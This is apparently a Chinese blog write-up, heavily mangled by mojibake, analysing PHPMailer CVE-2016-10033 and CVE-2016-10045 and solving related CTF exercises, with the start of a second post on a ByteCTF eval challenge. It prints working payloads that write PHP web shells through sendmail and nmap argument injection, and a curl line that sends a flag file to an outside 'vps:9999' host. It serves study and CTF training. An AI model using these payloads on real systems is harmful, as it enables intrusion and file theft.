å‘½ä»¤æ‰§è¡Œæ¼æ´ ï¼ˆ CVE-2016-10045 å’Œ CVE-2016-10033 ï¼‰ã€‚ CVE-2016-10033 åˆæ˜¯Pç‰›çš„æ–‡ç« ï¼šhttps://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html Seebugï¼šhttps://paper.seebug.org/161/ ç¯å¢ƒæ­å»º Dockerfileï¼š 12345FROM php:5.6-apacheRUN apt-get update &amp;&amp; apt-get install -y sendmailRUN echo &#x27;sendmail_path = &quot;/usr/sbin/sendmail -t -i&quot;&#x27; &gt; /usr/local/etc/php/php.ini æå‰ä¸‹è½½å¥½æºç ï¼Œåœ¨æºç æ ¹ç›®å½•ä¸‹æ·»åŠ æµ‹è¯•æ–‡ä»¶ 1.phpï¼š 123456789101112&lt;?phprequire(&#x27;PHPMailerAutoload.php&#x27;);$mail = new PHPMailer;$mail-&gt;setFrom($_GET[&#x27;x&#x27;], &#x27;Vuln Server&#x27;);$mail-&gt;Subject = &#x27;subject&#x27;;$mail-&gt;addAddress(&#x27;c@d.com&#x27;, &#x27;attacker&#x27;);$mail-&gt;msgHTML(&#x27;test&#x27;);$mail-&gt;AltBody = &#x27;Body&#x27;;$mail-&gt;send();?&gt; shellï¼š 12docker build -t cve-2016-10033 .docker run --rm --name vuln-phpmail -p 8080:80 -v &#x2F;home&#x2F;ca01h&#x2F;phpmail&#x2F;deploy&#x2F;PHPMailer-5.2.17:&#x2F;var&#x2F;www&#x2F;html cve-2016-10033 æ¼æ´åŸç† æ¼æ´å…·ä½“ä½ç½®åœ¨ class.phpmailer.php ä¸­ï¼š 123456789101112private function mailPassthru($to, $subject, $body, $header, $params)&#123; //Can&#x27;t use additional_parameters in safe_mode //@link http://php.net/manual/en/function.mail.php if (ini_get(&#x27;safe_mode&#x27;) or !$this-&gt;UseSendmailOptions or is_null($params)) &#123; $result = @mail($to, $subject, $body, $header); &#125; else &#123; $result = @mail($to, $subject, $body, $header, $params); &#125; return $result; &#125; è¿™é‡Œ$paramä½œä¸ºmailçš„ç¬¬äº”ä¸ªå‚æ•°ï¼Œè¯¥å‚æ•°ç”¨äºæŒ‡å®šsendmailçš„é¢å¤–å‚æ•°ï¼Œå…¶ä¸­sendmailçš„-Xå‚æ•°ä¼šå°†æµé‡è®°å½•åˆ°æ–‡ä»¶ä¸­ä»è€Œå†™æ–‡ä»¶å®ç° RCEï¼Œè¿›ä¸€æ­¥è·Ÿè·Ÿè¿› $params å‚æ•°ï¼Œçœ‹çœ‹å®ƒæ˜¯æ€ä¹ˆæ¥çš„ã€‚ 1234567891011121314151617181920212223242526272829303132333435protected function mailSend($header, $body) &#123; $toArr = array(); foreach ($this-&gt;to as $toaddr) &#123; $toArr[] = $this-&gt;addrFormat($toaddr); &#125; $to = implode(&#x27;, &#x27;, $toArr); $params = null; //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver if (!empty($this-&gt;Sender)) &#123; $params = sprintf(&#x27;-f%s&#x27;, $this-&gt;Sender); &#125; if ($this-&gt;Sender != &#x27;&#x27; and !ini_get(&#x27;safe_mode&#x27;)) &#123; $old_from = ini_get(&#x27;sendmail_from&#x27;); ini_set(&#x27;sendmail_from&#x27;, $this-&gt;Sender); &#125; $result = false; if ($this-&gt;SingleTo and count($toArr) &gt; 1) &#123; foreach ($toArr as $toAddr) &#123; $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params); $this-&gt;doCallback($result, array($toAddr), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From); &#125; &#125; else &#123; $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params); $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From); &#125; if (isset($old_from)) &#123; ini_set(&#x27;sendmail_from&#x27;, $old_from); &#125; if (!$result) &#123; throw new phpmailerException($this-&gt;lang(&#x27;instantiate&#x27;), self::STOP_CRITICAL); &#125; return true; &#125; é‡ç‚¹å…³æ³¨ç¬¬12è¡Œï¼Œå¾ˆæ˜æ˜¾ $params æ˜¯ä» $this-&gt;Sender ä¼ è¿›æ¥çš„ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸‹ $this-&gt;Senderã€‚ 12345678910111213141516171819202122232425public function setFrom($address, $name = &#x27;&#x27;, $auto = true) &#123; $address = trim($address); $name = trim(preg_replace(&#x27;/[\\r\\n]+/&#x27;, &#x27;&#x27;, $name)); //Strip breaks and trim // Don&#x27;t validate now addresses with IDN. Will be done in send(). if (($pos = strrpos($address, &#x27;@&#x27;)) === false or (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and !$this-&gt;validateAddress($address)) &#123; $error_message = $this-&gt;lang(&#x27;invalid_address&#x27;) . &quot; (setFrom) $address&quot;; $this-&gt;setError($error_message); $this-&gt;edebug($error_message); if ($this-&gt;exceptions) &#123; throw new phpmailerException($error_message); &#125; return false; &#125; $this-&gt;From = $address; $this-&gt;FromName = $name; if ($auto) &#123; if (empty($this-&gt;Sender)) &#123; $this-&gt;Sender = $address; &#125; &#125; return true; &#125; å°† $address ç»è¿‡æŸäº›å¤„ç†ä¹‹åèµ‹å€¼ç»™ $this-&gt;Senderï¼Œç»§ç»­è¿½è¸ªvalidateAddresså‡½æ•°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public static function validateAddress($address, $patternselect = null) &#123; if (is_null($patternselect)) &#123; $patternselect = self::$validator; &#125; if (is_callable($patternselect)) &#123; return call_user_func($patternselect, $address); &#125; //Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321 if (strpos($address, &quot;\\n&quot;) !== false or strpos($address, &quot;\\r&quot;) !== false) &#123; return false; &#125; if (!$patternselect or $patternselect == &#x27;auto&#x27;) &#123; //Check this constant first so it works when extension_loaded() is disabled by safe mode //Constant was added in PHP 5.2.4 if (defined(&#x27;PCRE_VERSION&#x27;)) &#123; //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2 if (version_compare(PCRE_VERSION, &#x27;8.0.3&#x27;) &gt;= 0) &#123; $patternselect = &#x27;pcre8&#x27;; &#125; else &#123; $patternselect = &#x27;pcre&#x27;; &#125; &#125; elseif (function_exists(&#x27;extension_loaded&#x27;) and extension_loaded(&#x27;pcre&#x27;)) &#123; //Fall back to older PCRE $patternselect = &#x27;pcre&#x27;; &#125; else &#123; //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension if (version_compare(PHP_VERSION, &#x27;5.2.0&#x27;) &gt;= 0) &#123; $patternselect = &#x27;php&#x27;; &#125; else &#123; $patternselect = &#x27;noregex&#x27;; &#125; &#125; &#125; switch ($patternselect) &#123; case &#x27;pcre8&#x27;: ...... case &#x27;pcre&#x27;: ...... case &#x27;html5&#x27;: ...... case &#x27;noregex&#x27;: //No PCRE! Do something _very_ approximate! //Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char return (strlen($address) &gt;= 3 and strpos($address, &#x27;@&#x27;) &gt;= 1 and strpos($address, &#x27;@&#x27;) != strlen($address) - 1); case &#x27;php&#x27;: default: return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL); &#125; &#125; è¿™ä¸ªå‡½æ•°çš„å¤§æ¦‚æµç¨‹å°±æ˜¯ï¼š é»˜è®¤patternselect==â€˜autoâ€™ï¼Œå®ƒä¼šè‡ªåŠ¨é€‰æ‹©ä¸€ä¸ªæ–¹å¼å¯¹emailè¿›è¡Œæ£€æµ‹ å¦‚æœphpæ”¯æŒæ­£åˆ™PCREï¼ˆä¹Ÿå°±æ˜¯åŒ…å«preg_replaceå‡½æ•°ï¼‰ï¼Œå°±ç”¨æ­£åˆ™çš„æ–¹å¼æ¥æ£€æŸ¥ï¼Œå°±æ˜¯é‚£ä¸€å¤§ä¸²å¾ˆéš¾è¯»æ‡‚çš„æ­£åˆ™ å¦‚æœphpä¸æ”¯æŒPCREï¼Œä¸”PHPç‰ˆæœ¬å¤§äºPHP5.2.0ï¼Œå°±æ˜¯ç”¨PHPè‡ªå¸¦çš„filteræ¥æ£€æŸ¥email å¦‚æœphpä¸æ”¯æŒPCREï¼Œä¸”PHPç‰ˆæœ¬ä½äºPHP5.2.0ï¼Œå°±ç›´æ¥æ£€æŸ¥emailä¸­æ˜¯å¦åŒ…å«@ å¦‚æœæ˜¯ç¬¬å››ç§æƒ…å†µçš„è¯ï¼Œè¿™ä¸ªæ—¶å€™è¯¥å‡½æ•°ä¼šä½¿ç”¨noregexçš„æ–¹å¼ï¼Œå³åªéœ€æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶å³å¯é€šè¿‡è¿‡æ»¤ï¼š è¾“å…¥é•¿åº¦å¤§äº 3 å«æœ‰@ @ä¸æ˜¯æœ€åä¸€ä¸ªå­—ç¬¦ è¿™ä¸‰ä¸ªæ¡ä»¶æ¯”è¾ƒå®¹æ˜“æ»¡è¶³ï¼Œä¹Ÿæœ‰å¤ç°ç¯å¢ƒå’ŒPocï¼šhttps://github.com/opsxcq/exploit-CVE-2016-10033 ä½†æ˜¯æ»¡è¶³è¿™ä¸ªæƒ…å†µçš„ä¸»æœºç°åœ¨å·²ç»å¾ˆå°‘äº†ï¼Œæ­£å¸¸æƒ…å†µä¸‹éƒ½æ˜¯ä½¿ç”¨pcre8çš„æ­£åˆ™æ¥è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥å¦‚æœè¦æ‰©å¤§æ”»å‡»é¢éœ€è¦å¯¹æ­£åˆ™è¿›è¡Œç»•è¿‡ï¼Œå¹¶ä¸”è¿˜å¾—è®© sendmail æˆåŠŸæ‰§è¡Œã€‚ æœ‰å‡ ç§payloadå¯ä»¥ç»•è¿‡é‚£äº›çœ‹ç€å¤´å¤§çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š æ­£åˆ™è¡¨è¾¾å¼åˆ†æï¼š https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html 1&quot;&lt;?system($_GET[&#39;pew&#39;]);?&gt;&quot;. -OQueueDirectory&#x3D;&#x2F;tmp&#x2F;. -X.&#x2F;images&#x2F;zwned.php @swehack.org è¿™é‡Œä½¿ç”¨.%20ï¼ˆç‚¹+ç©ºæ ¼ï¼‰æ¥ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå®é™…æµ‹è¯•ä¸€ä¸‹ï¼Œå·²ç»å†™å…¥äº†shell.php è®¿é—®ï¼š 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;1.php?x&#x3D;%22%3C?system($_GET[%27x%27]);?%3E%22.%20-OQueueDirectory&#x3D;&#x2F;tmp&#x2F;.%20-X&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php%20@a.com Pç‰›çš„payloadï¼š 1aaa( -X&#x2F;home&#x2F;www&#x2F;success.php -OQueueDirectory&#x3D;&#x2F;tmp )@qq.com CVE-2016-10045 Seebugæ–‡ç« ï¼šhttps://paper.seebug.org/164/ ç¯å¢ƒæ­å»º å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œå°±æ˜¯æŠŠæºä»£ç æ¢æˆ5.2.20ç‰ˆæœ¬ æ¼æ´åŸç† é¦–å…ˆçœ‹è¡¥ä¸ï¼š é’ˆå¯¹ç”¨æˆ·è¾“å…¥ä½¿ç”¨ escapeshellarg å‡½æ•°è¿›è¡Œå¤„ç†ã€‚æ‰€ä»¥ï¼Œåœ¨æœ€æ–°ç‰ˆæœ¬ä¸­ä½¿ç”¨ä¹‹å‰çš„ payload è¿›è¡Œæ”»å‡»ä¼šå¤±è´¥ï¼Œä¾‹å¦‚ï¼š 1a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com ä½†æ˜¯ï¼Œå´å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ª payload è¿›è¡Œæ”»å‡»ï¼š 1a&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com å®é™…ä¸Šï¼Œå¯ç”¨äºæ”»å‡»çš„ä»£ç åªæ˜¯åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šå¤šäº†ä¸€ä¸ªå•å¼•å·ã€‚ä¹‹æ‰€ä»¥è¿™æ¬¡çš„æ”»å‡»ä»£ç èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºä¿®å¤ä»£ç å¤šäº† escapeshellcmd å‡½æ•°ï¼Œç»“åˆä¸Š mail() å‡½æ•°åº•å±‚è°ƒç”¨çš„ escapeshellarg å‡½æ•°ï¼Œæœ€ç»ˆå¯¼è‡´å•å¼•å·é€ƒé€¸ã€‚ 1234567&lt;?php$payload = &quot;a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/shell.php )@qq.com&quot;;$earg = escapeshellarg($payload);var_dump($earg);$ecmd = escapeshellcmd($earg);var_dump($ecmd);?&gt; æˆ‘ä»¬çš„ payload æœ€ç»ˆåœ¨æ‰§è¡Œæ—¶å˜æˆäº†'-fa'\\\\''\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)@a.com\\'ï¼Œåˆ†å‰²åå°±æ˜¯-fa\\(ã€-OQueueDirectory=/tmpã€-X/var/www/html/test.phpã€)@a.com'ï¼Œæœ€ç»ˆçš„å‚æ•°å°±æ˜¯è¿™æ ·è¢«æ³¨å…¥çš„ã€‚ 0x03 ç»ƒä¹ é¢˜ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phphighlight_file(&#x27;index.php&#x27;);function waf($a)&#123; foreach($a as $key =&gt; $value)&#123; if(preg_match(&#x27;/flag/i&#x27;,$key))&#123; exit(&#x27;are you a hacker&#x27;); &#125; &#125;&#125;foreach(array(&#x27;_POST&#x27;, &#x27;_GET&#x27;, &#x27;_COOKIE&#x27;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET[&#x27;flag&#x27;]))&#123; if($_GET[&#x27;flag&#x27;] === $_GET[&#x27;hongri&#x27;])&#123; exit(&#x27;error&#x27;); &#125; if(md5($_GET[&#x27;flag&#x27;] ) == md5($_GET[&#x27;hongri&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; $urlInfo = parse_url($url); if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;])))&#123; die( &quot;scheme error!&quot;); &#125; $url = escapeshellarg($url); $url = escapeshellcmd($url); system(&quot;curl &quot;.$url); &#125;&#125;?&gt; 1234// flag.php&lt;?php$flag = &quot;HRCTF&#123;Are_y0u_maz1ng&#125;&quot;;?&gt; è€ƒç‚¹ä¸€ è¿™é‡Œæ¶‰åŠåˆ°å¯å˜å˜é‡çš„æ¦‚å¿µ 1234567foreach(array(&#x27;_POST&#x27;, &#x27;_GET&#x27;, &#x27;_COOKIE&#x27;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125; é¦–å…ˆå¾ªç¯è·å–è¶…å…¨å±€å˜é‡_POSTã€_GETã€_COOKIEï¼Œå¹¶ä¾æ¬¡èµ‹å€¼ç»™$__Rã€‚å†ç¬¬äºŒè¡Œåˆ¤æ–­$$__Ræ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œé‚£ä¹ˆç»§ç»­åˆ¤æ–­_POSTã€_GETã€_COOKIEä¸­æ˜¯å¦å­˜åœ¨é”®å€¼ç›¸ç­‰çš„ï¼Œå¦‚æœç›¸ç­‰åˆ™åˆ é™¤å˜é‡ã€‚ å‡å¦‚æˆ‘ä»¬é€šè¿‡GETæäº¤flag=ca01hï¼Œæ¥ç€é€šè¿‡POSTæäº¤_GET[flag]=ca01hã€‚é‚£ä¹ˆéå†$_POST è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ$__keyå°±ç­‰äº_GET[flag]ï¼Œ$__vå°±ç­‰äºca01hï¼Œæ‰€ä»¥$$__keyç­‰äº$_GET[flag]ï¼Œå³ca01hï¼Œæ­¤æ—¶$$__k==$__væˆç«‹ï¼Œå˜é‡$_GET[flag]å°±è¢«é‡Šæ”¾äº†ã€‚æ¥ç€å¦‚æœè¿™äº›è¶…å…¨å±€å˜é‡å­˜åœ¨çš„è¯ï¼Œå¯¹å®ƒä»¬çš„é”®åè¿›è¡Œä¸€ä¸ªwafè¿‡æ»¤ï¼Œä½†æ˜¯åœ¨ ç¬¬21è¡Œ å’Œ 22è¡Œ æœ‰è¿™æ ·ä¸€ä¸²ä»£ç ï¼š 12if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP); extractæ˜¯å˜é‡è¦†ç›–å¸¸ç”¨çš„å‡½æ•°ï¼Œä½œç”¨æ˜¯å°†å¯¹è±¡å†…çš„é”®åå˜æˆä¸€ä¸ªå˜é‡åï¼Œè€Œè¿™ä¸ªå˜é‡å¯¹åº”çš„å€¼å°±æ˜¯è¿™ä¸ªé”®åçš„å€¼ï¼ŒEXTR_SKIP å‚æ•°è¡¨ç¤ºå¦‚æœå‰é¢å­˜åœ¨æ­¤å˜é‡ï¼Œä¸å¯¹å‰é¢çš„å˜é‡è¿›è¡Œè¦†ç›–å¤„ç†ã€‚ç”±äºæˆ‘ä»¬å‰é¢é€šè¿‡ POST è¯·æ±‚æäº¤ _GET[flag]=test ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå˜æˆ $_GET[flag]=test ï¼Œè¿™é‡Œçš„$_GETå˜é‡å°±ä¸éœ€è¦å†ç»è¿‡ waf å‡½æ•°æ£€æµ‹äº†ï¼Œä¹Ÿå°±ç»•è¿‡äº†preg_match(â€˜/flag/iâ€™,$key)çš„é™åˆ¶ã€‚ è€ƒç‚¹äºŒ 123456789101112131415if(isset($_GET[&#x27;flag&#x27;]))&#123; if($_GET[&#x27;flag&#x27;] === $_GET[&#x27;hongri&#x27;])&#123; exit(&#x27;error&#x27;); &#125; if(md5($_GET[&#x27;flag&#x27;] ) == md5($_GET[&#x27;hongri&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; $urlInfo = parse_url($url); if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;])))&#123; die( &quot;scheme error!&quot;); &#125; $url = escapeshellarg($url); $url = escapeshellcmd($url); system(&quot;curl &quot;.$url); &#125;&#125; ç¬¬äºŒè¡Œå’Œç¬¬äº”è¡Œçš„ä¸¤ä¸ªifè¯­å¥ç”¨md5ç¢°æ’å°±å¯ä»¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥ä¸»è¦è€ƒå¯Ÿcurlè¯»å–æ–‡ä»¶ã€‚ åœ¨ curl ä¸­å­˜åœ¨ -F æäº¤è¡¨å•çš„æ–¹æ³•ï¼Œå¯ä»¥æäº¤æ–‡ä»¶ã€‚ -F &lt;key=value&gt; å‘æœåŠ¡å™¨POSTè¡¨å•ï¼Œä¾‹å¦‚ï¼š curl -F â€œweb=@index.html;type=text/htmlâ€ url.com ã€‚æäº¤æ–‡ä»¶ä¹‹åï¼Œåˆ©ç”¨ä»£ç†çš„æ–¹å¼è¿›è¡Œç›‘å¬ï¼Œè¿™æ ·å°±å¯ä»¥æˆªè·åˆ°æ–‡ä»¶äº†,åŒæ—¶è¿˜ä¸å—æœ€åçš„çš„å½±å“ã€‚ è¿™é‡Œçš„ ç¬¬11è¡Œ å’Œ ç¬¬12è¡Œ å¢åŠ äº†ä¸¤ä¸ªè¿‡æ»¤ï¼Œå‚ç…§ä¸Šé¢çš„çŸ¥è¯†ç‚¹ç»•è¿‡ã€‚ æ‰€ä»¥è¿™é¢˜æœ€åçš„ payload ï¼š 1&#x2F;index.php?flag&#x3D;QNKCDZO&amp;hongri&#x3D;s878926199a&amp;url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;&#39; -F file&#x3D;@&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php -x vps:9999 POSTï¼š 1_GET[flag]&#x3D;QNKCDZO&amp;_GET[hongri]&#x3D;s878926199a&amp;_GET[url]&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;&#39; -F file&#x3D;@&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php -x vps:9999 0x04 é™„åŠ ç»ƒä¹ é¢˜ é¢˜ç›®åœ°å€ï¼š[BUU2018 Online Tool](https://buuoj.cn/challenges#[BUUCTF 2018]Online Tool) æºç ï¼š 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; æœ€åä¸€è¡Œä»£ç æ˜¯æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä¸”æœ‰ä¼ å‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œäº†ã€‚è¿™é‡Œå¸¸è§çš„å‘½ä»¤åæ³¨å…¥æ“ä½œå¦‚ | &amp; &amp;&amp;éƒ½ä¸è¡Œï¼Œescapeshellcmdä¼šå¯¹è¿™äº›ç‰¹æ®Šç¬¦å·å‰é¢åŠ ä¸Š\\æ¥è½¬ä¹‰ã€‚ é‚£ä¹ˆå°±åº”è¯¥æƒ³æƒ³æ€ä¹ˆåˆ©ç”¨nmapæ¥åšäº›ä»€ä¹ˆã€‚ nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGæˆ–è€…-oNå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶ æ¥ä¸‹æ¥è€ƒè™‘ä¸¤ä¸ªå‡½æ•°çš„æ•ˆæœï¼Œæµ‹è¯•ä»£ç ï¼š 12345678910111213&lt;?php$host = &quot;&#x27; &lt;?php phpinfo;?&gt; -oG shell.php &#x27;&quot;;$host = (string)$host;echo &quot;host:&quot;.$host;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;$arg = escapeshellarg($host);echo &quot;arg:&quot;.$arg;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;$cmd = escapeshellcmd($arg);echo &quot;cmd:&quot;.$cmd;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);?&gt; è¾“å‡º\\ï¼š 123host:&#39; &lt;?php phpinfo;?&gt; -oG shell.php &#39;&lt;&#x2F;br&gt;arg:&#39;&#39;\\&#39;&#39; &lt;?php phpinfo;?&gt; -oG shell.php &#39;\\&#39;&#39;&#39;&lt;&#x2F;br&gt;cmd:&#39;&#39;\\\\&#39;&#39; \\&lt;\\?php phpinfo\\;\\?\\&gt; -oG shell.php &#39;\\\\&#39;&#39;&#39;&lt;&#x2F;br&gt; escapeshellargä¼šå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œæ­¤æ—¶çš„ç»“æœåº”è¯¥æ˜¯è¿™æ ·çš„ï¼š 1\\&#39;-oG &lt;?php phpinfo();?&gt; -oG shell.php \\&#39; ç„¶åå¯¹\\åˆ†å‰²çš„æ¯ä¸ªéƒ¨åˆ†åŠ ä¸Šå•å¼•å·ï¼Œå¹¶è¿æ¥ï¼Œç»“æœå¦‚ä¸‹ï¼š 1&#39;&#39;\\&#39;&#39;-oG &lt;?php phpinfo();?&gt; -oG shell.php &#39;\\&#39;&#39;&#39; ä¹‹åï¼Œè¿›è¡Œäº†escapeshellcmdï¼Œä¼šå¯¹ä¸Šè¾¹æåˆ°çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼š 1&#39;&#39;\\\\&#39;&#39;\\&lt;\\?php phpinfo\\(\\)\\;\\?\\&gt; -oG shell.php &#39;\\\\&#39;&#39;&#39; å¸¦å…¥åˆ°å‘½ä»¤è¡Œæ‰§è¡Œçš„ç»“æœå°±æ˜¯ï¼š 1\\ &lt;?php phpinfo();?&gt; -oG shell.php \\\\ payloadï¼š 1?host&#x3D;&#39; &lt;?php phpinfo();?&gt; -oG shell.php &#39; è¯»å–flagï¼š 1?host&#x3D;&#39; &lt;?php echo &#96;cat &#x2F;flag&#96;;?&gt; -oG mmm.php &#39;","tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"ä»£ç å®¡è®¡/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"ä»ä¸€é“é¢˜å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨","date":"2020-06-15T03:32:53.000Z","path":"Web_security/php_related/9.ä»ä¸€é“é¢˜å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨/","text":"ä»ByteCTF boringcode å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨ 0x01 é¢˜ç›®æºç  é¢˜ç›®ç¯å¢ƒï¼šhttps://github.com/CTFTraining/bytectf_2019_web_boring_code 123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match(&#x27;/data:\\/\\//i&#x27;, $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST[&#x27;url&#x27;]))&#123; $url = $_POST[&#x27;url&#x27;]; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match(&#x27;/baidu\\.com$/&#x27;, $r[&#x27;host&#x27;])) &#123; $code = file_get_contents($url); if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123; if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo &quot;error: host not allowed&quot;; &#125; &#125; else &#123; echo &quot;error: invalid url&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; ç®€å•åˆ†æä¸€ä¸‹ï¼Œè¿™ä¸ªé¡µé¢çš„ä½œç”¨æ˜¯ï¼Œæ¥å—ä¸€ä¸ªurlå‚æ•°ï¼Œåˆ©ç”¨file_get_contentè¿œç¨‹è·å–urlé¡µé¢çš„æºç ï¼Œä¼ é€’ç»™evalæ‰§è¡Œã€‚ä½†åœ¨urlä¼ é€’å’Œæºç ä¼ é€’è¿‡ç¨‹ä¸­æœ‰å„ç§æ£€æµ‹ã€‚ 0x02 è€ƒç‚¹ä¸€ is_valid_url()å‡½æ•°æ¥æ£€æµ‹urlçš„æ­£ç¡®æ€§ï¼Œå¹¶ç¦æ­¢ä½¿ç”¨dataåè®®ã€‚ urlçš„hostå¿…é¡»ä»¥baidu.comç»“å°¾ã€‚ è¿™é‡Œå¦‚æœæ²¡æœ‰is_valid_url()æ˜¯å¯ä»¥ä½¿ç”¨dataä¼ªåè®®ç»•è¿‡åŸŸåçš„é™åˆ¶ï¼Œå¦‚ä¸‹é¢çš„ä¾‹å­æ‰€ç¤ºï¼š PHP.iniï¼š data://åè®®å¿…é¡»åŒåœ¨onæ‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼› allow_url_fopen ï¼šon allow_url_includeï¼šon php ç‰ˆæœ¬å¤§äºç­‰äº php5.2 12345678&lt;?php$url = $_POST[&#x27;url&#x27;];$r = parse_url($url);if (preg_match(&#x27;/baidu\\.com$/&#x27;, $r[&#x27;host&#x27;]))&#123; $code = file_get_contents($url);&#125;eval($code); è¿™é‡ŒæŠŠdataåè®®ç¦æ­¢äº†ä¹‹åï¼Œæƒ³è¦åˆ©ç”¨ä¼ªåè®®ç»•è¿‡çš„è¯è¿‘ä¹æ— è§£ã€‚ ä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šéªšæ“ä½œï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦è®²ä¸‹é¢çš„çŸ¥è¯†ï¼Œè‡³äºæ€ä¹ˆç»•è¿‡æˆ‘å°±ç›´æ¥æ”¾ä¸€ä¸ªé“¾æ¥ï¼šhttps://www.guildhab.top/?p=1077 0x02 è€ƒç‚¹äºŒ 